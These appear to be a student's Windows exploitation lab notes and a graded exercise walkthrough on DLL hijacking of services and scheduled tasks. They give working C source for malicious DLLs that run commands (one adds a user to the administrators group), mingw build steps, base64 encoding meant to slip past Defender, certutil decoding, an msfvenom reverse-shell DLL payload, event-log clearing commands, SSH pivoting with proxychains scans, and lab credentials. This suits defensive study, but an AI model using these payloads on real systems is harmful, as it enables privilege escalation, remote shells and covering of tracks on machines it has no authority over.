## Windows Exploitation Notes ##

ssh student@10.50.23.132 -L 36363:10.10.28.45:3389

xfreerdp /v:127.0.0.1:36363 /u:student /p:password /size:1920x1000 +clipboard

#### Windows Access Control Model ####

In charge of files that gives uses permissions. Users and groups are represented by unique SIDS, security identifiers. 

SACL -> stands for System Access Control List. SACLs allow administrators to log attempts to access a secured object. They can also be used to generate audit records to determine when access is granted, when access is denied, or both.

DACL -> stands for Discretionary Access Control List. DACLs identify the users and groups that are assigned or denied access permissions on an object. DACLs can be NULL or nonexistent (no restrictions, everyone full access), empty (no access at all), or a list. 

ACEs -> stands for Access Control Elements. An ACL is an ordered list of classification rules and actions. Each single classification rule, together with its action, is called an ACE. Each ACE specifies the types of access attempts by a specified trustee that cause the system to generate a record in the security event log.

Anytime windows needs to access dlls, it access this directory -> `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`

Windows also check the directory the application was run from. 

procexpe.exe 

view -> select columns -> integrity level # View permissions i.e. integrity levels -> UNTRUSTED(Anonymous SID access tokens), LOW (Everyone SID access token (World)), MEDIUM (Authenticated Users), HIGH(Administrators), SYSTEM (Administrators), System services (LocalSystem, LocalServices, NetworkService)

Checking UAC Settings --> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

1. Step 1. services -> 
    Sort by description -> click on description, upper arrow
    Double click on it
    See the path to executable
        For informational purposes. Can we actually attach maybe a dll here? 

2. Step 2. Open task scheduler 
    Look at actions

3. Step 3. How to identify the name of the DLL to hijack 
    Identify the source code. 
    Look at the user account and we have exercise 2, we can create a folder here 
    We found putty at student/exercise_2
    looking at putty's dlls, we find that it could be vulnerable online but the dlls are patched and vulnerability is fixed 

4. Step 4. Go back to the procmon.exe from the search bar
    Filter -> Column = Process Name, Relation = is, Value = putty.exe, Action = Include, then click Add
    Filter -> Column = Result, Relation = is, Value = NAME NOT FOUND, Action = Include, then click Add
    Filter -> Column = Path, Relation = contains, Value = dll, Action = Include, then click Add
    Click Okay 

5. Step 5. Go to Task Schedular:
    Right click on test_app -> Click End
    Right click on test_app -> Click Run 

    Procmon interface should be populated

6. Step 6. Go back to linops:
    Create a file called bad.exe, modify it like so and pay attention to the path where the file is stored i.e. WinExec:
    
    #include <windows.h>
    int execCommand()
    {
    WinExec("cmd /C whoami > C:\\users\\DemoAdmin\\FINDME_1.txt", 1);
    return 0;
    }
    BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
    {
    execCommand();
    return 0;
    }

7. Step 7.

Run `sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y`
Run `i686-w64-mingw32-g++ -c bad.c -o bad.o`
Run `i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a`
Run `base64 bad.dll > base64dll` Encodes it to base 64 to prevent detection 
Run `xclip -sel c -i base64dll ` Copies it to clipboard


8. Step 8. Go to the windows machine and open notepad. 

9. Step 9. Paste the copied base64dll and save it as base64dll.txt in documents. 

10. Step 10. Go to the location of the text `cd C:\Users\student.DESKTOP-51TGRU5\Documents\`

11. Step 11. Generate a dll -> C:\Users\student.DESKTOP-51TGRU5\Documents>`certutil -decode base64dll.txt SSPICLI.dll`

12. Step 12. Go to the location of the exercise_2 folder where the putty file rescided -> C:\Users\student.DESKTOP-51TGRU5\Documents> `copy SSPICLI.dll "c:\users\student\exercise_2\SSPICLI.dll"\`

13. Step 13. Go to Task Schedular:
    Right click on test_app -> Click End
    Right click on test_app -> Click Run 

14. Step 14. Check the location where the file was stored in the C code i.e. -> `C:\Users\DemoAdmin\` and you will find the FINDME_1 saved here which is the command on the C file. 

### OTHER NOTES ###

WinExec -> windows execution .exe. Prebuilt by microsoft. First argument is the one we are interested in manipulating. 

5. Alternative method for DLL creation using MSFVenom -> creates a reverse_tcp -> msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > bad.dll

6. `base64 bad.dll >base64dll` # Generate a base64 dll....why????

7. `xclip -sel c -i base64dll` # reads the output to your clipboard -> doing this so that the defender doesn't catch it. 


### FOR REPLACING EXECUTABLES THIS IS WHERE YOU SHOULD GO ###
C:Program Files/7Zip/
    Rename 7Zip.exe -> Makes the file not possible to run. 


If you wanna find out where someone has installed persistence go to registry. 

### SYSTEM USAGE ###


DEMO: Finding vulnerable Scheduled Tasks `schtasks /query /fo LIST /v`

DEMO: Finding Vulnerable Services
    `wmic service list full`
    `sc query`

Checking system resources -> 
    `wmic`
    `net`
    `netstat`

DEMO: Audit Logging Show all audit category settings `auditpol /get /category:*`
What does the below command show? `auditpol /get /category:* | findstr /i "success failure"` shows if you successfully escalaged privileges

#### DEMO: Event Logging ####
Storage: c:\windows\system32\config\

File-Type: .evtx/.evt
    `wevtutil el`
    `wmic ntevent where "logfile="<LOGNAME>" list full`
    `Get-Eventlog -List`

#### DEMO: Additional Logging ####
Powershell verion

Determine PS version (bunch of ways)
`reg query hklm\software\microsoft\powershell\3\powershellengine\`
`powershell -command "$psversiontable"`

Determine if logging is set (PowerShell and WMIC)
`reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell`
`reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging # 0 = no | 1 = errors | 2 = verbose`
WMIC Log Storage `%systemroot%\system32\wbem\Logs\`

Clear Event Logs (produces logging!):
`wevtutil clear-log Application`
`Clear-Eventlog -Log Application, System`

#### EVENT VIEWER ####

Windows Logs -> System -> Filter Current Log (on the right) -> Under <All Event ID> replace with the number event id e.g. 7045

























1. Event Log 1

What service is causing an error level log for 31 May between 1200-1330 hrs. System log file is located under your currently logged in user's directory.

Step 1; Create a local tunnel to Pivot(192.168.28.105)

student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:192.168.28.105:2222 -NT

Step 2: Create Dynamic to pivot point

Ssh comrae@localhost –p 50511 –D 9050 –NT

Step 3: Scan the T1 student@lin-ops:~$ proxychains nmap -Pn 192.168.28.5 -p 1-5000 

#### img-1

Step 3: Create a Tunell to t1 (192.168.28.5)

student@lin-ops:~$ ssh comrade@localhost -p 50511 -L 50522:192.168.28.5:3389 –NT

Step 4: RDP to the tunnel to T1

If yiu get error rremove the known_hosts

xfreerdp /v:localhost:50522 /u:comrade /p:StudentPrivPassword /size:1000x1000 +clipboard 

#### img-2

Step 5:

1. File explorer --> Users--> comrade --> open system --> filter for error 2. Fortnite

#### img-3

2. Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD

2019-05-31

3. Using the same "system.evtx" log, is this a legitimate service? To correctly answer the question enter Y or N.

N

4. Using the same "system.evtx" log, The system time has changed, what is the new year?

Clear filters----sort by date and time 

#### img-4

5. Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name. 

#### img-5

Here, memory status has no descriptions so this has to be the one

6. What Account will it utilize at Log on?

Logs on as Local System account 

#### img-6

7. What type of escalation can you perform with your findings?

DLL Hijacking

AutoElevate

UAC Bypass

Unprotected Executables

1. follow filepath of memory status Open *.c file in wordpad 3 search for dll --> hijackmeplz

#### img-7

8. What is the name of the DLL that is supposed to be loaded, by the vulnerable service?

Hijackmeplz

9. Sample code below has been provided by our dev shop, they have been testing it; however, it appears to not function and request if you can get it to function.

C #include int happyfunction(char * test) { WinExec(); return ; } BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved) { happyfunction(""); return 0;

Correct code in order to escalate your privileges. What you seek is waiting on the Admins Desktop.

Step 1: Nano hackmeplz.c

Step 2: Enter the following Info

#include <windows.h>

int execCommand()

{ WinExec("cmd /C net localgroup administrators John /add", 1); #googled what will add user to a admin group.

return 0;

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)

{

execCommand();

return 0;

}

Step 3: 

#### img-8


